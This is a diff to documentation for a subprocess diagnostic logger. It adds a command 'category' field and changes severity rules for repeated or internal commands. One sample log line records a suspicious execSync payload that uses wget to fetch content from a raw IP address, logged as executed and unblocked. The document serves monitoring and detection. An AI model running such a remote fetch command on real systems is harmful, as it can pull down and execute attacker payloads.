@@ -11,7 +11,7 @@ The subprocess diagnostic system monitors all subprocess executions (`exec`, `ex
 Logs are emitted in compact `key=value` format for easy grepping:
 
 ```
-[SUBPROC_DIAG] event=subprocess_attempt severity=INFO executed=true blocked=false logged=true reason=logged method=execSync payload_hash=abc123def456 payload_preview="(wget -qO- http://178.16.52.253/1utig" repeat_count=1 req_method=POST req_path=/api/episodes/new-draft req_cf_ip=192.0.2.1 user_id=123 user_role=admin source_file=route.ts
+[SUBPROC_DIAG] event=subprocess_attempt severity=INFO executed=true blocked=false logged=true category=unknown reason=logged method=execSync payload_hash=abc123def456 payload_preview="(wget -qO- http://178.16.52.253/1utig" repeat_count=1 req_method=POST req_path=/api/episodes/new-draft req_cf_ip=192.0.2.1 user_id=123 user_role=admin source_file=route.ts
 ```
 
 ### Debug Mode (`DEBUG_SUBPROC_DIAG=true`)
@@ -58,13 +58,13 @@ Logs are emitted as pretty-printed JSON with full payload and stack traces:
 
 ## Event Types
 
-| Event | Description | executed | blocked | logged | Severity |
-|-------|-------------|----------|---------|--------|----------|
-| `subprocess_exec_ok` | Allowlisted command executed successfully | true | false | true | INFO |
-| `subprocess_attempt` | Non-allowlisted command executed | true | false | true | INFO (WARN if repeated ≥5x) |
-| `subprocess_exec_fail` | Command execution failed | true | false | true | ERROR |
-| `subprocess_log_suppressed` | Logging suppressed (rate-limited), command still executes | true | false | false | INFO (WARN if repeated ≥5x) |
-| `subprocess_blocked` | Command execution prevented (future: not currently used) | false | true | true | ERROR |
+| Event | Description | executed | blocked | logged | category | Severity |
+|-------|-------------|----------|---------|--------|----------|----------|
+| `subprocess_exec_ok` | Allowlisted command executed successfully | true | false | true | media/sync/unknown | INFO |
+| `subprocess_attempt` | Non-allowlisted command executed | true | false | true | unknown | INFO (WARN if repeated ≥5x, except internal) |
+| `subprocess_exec_fail` | Command execution failed | true | false | true | unknown | ERROR |
+| `subprocess_log_suppressed` | Logging suppressed (rate-limited), command still executes | true | false | false | internal/media/sync/unknown | DEBUG (internal) or INFO (others) |
+| `subprocess_blocked` | Command execution prevented (future: not currently used) | false | true | true | unknown | ERROR |
 
 ## Field Descriptions
 
@@ -75,12 +75,18 @@ Logs are emitted as pretty-printed JSON with full payload and stack traces:
 - **`executed`**: `true` if command was executed (or attempted), `false` if execution was prevented
 - **`blocked`**: `true` if execution was prevented, `false` otherwise (currently always `false` - execution is never blocked)
 - **`logged`**: `true` if this event was logged, `false` if logging was suppressed (rate-limited)
+- **`category`**: Command category for noise filtering (`internal`, `media`, `sync`, `unknown`)
 - **`reason`**: Why the event was logged (`allowlisted`, `logged`, `log_suppressed`, `execution_failed`)
 - **`timestamp`**: ISO 8601 timestamp
 - **`method`**: Subprocess method (`exec`, `execSync`, `execFile`, `spawn`, `spawnSync`)
 
 ### Command Fields
 
+- **`category`**: Command category classification:
+  - `internal`: Known internal noise commands (e.g., `git config`) - never escalate to WARN
+  - `media`: Media processing commands (e.g., `ffprobe`, `ffmpeg`)
+  - `sync`: Synchronization commands (e.g., `rsync`)
+  - `unknown`: All other commands
 - **`cmd_allowlisted_name`**: Base command name if allowlisted (e.g., `git`, `ffprobe`), `undefined` otherwise
 - **`argv_redacted`**: Command arguments with secrets redacted (only for `execFile`/`spawn`)
 - **`payload_hash`**: SHA256 hash (first 16 chars) of the full command string
@@ -158,11 +164,13 @@ This is a suspicious command (not allowlisted) that has been repeated 5+ times:
 ### Log Suppression (Rate-Limited)
 
 ```
-[SUBPROC_DIAG] event=subprocess_log_suppressed severity=INFO executed=true blocked=false logged=false reason=log_suppressed method=execSync payload_hash=def456 repeat_count=2
+[SUBPROC_DIAG] event=subprocess_log_suppressed severity=DEBUG executed=true blocked=false logged=false category=internal reason=log_suppressed method=execSync payload_hash=def456 repeat_count=8250
 ```
 
 This command was executed but logging was suppressed (rate-limited):
 - **Meaning**: Command still executed (`executed=true`), but logging was suppressed (`logged=false`) to prevent log spam
+- **Severity**: `DEBUG` for internal noise commands (e.g., `git config`), `INFO` for others - never WARN/ERROR
+- **Category**: `internal` commands never escalate to WARN regardless of repeat count
 - **Action**: Check previous log entry for this `payload_hash` to see the full context
 - **Note**: `blocked=false` means execution was NOT prevented, only logging was suppressed
 
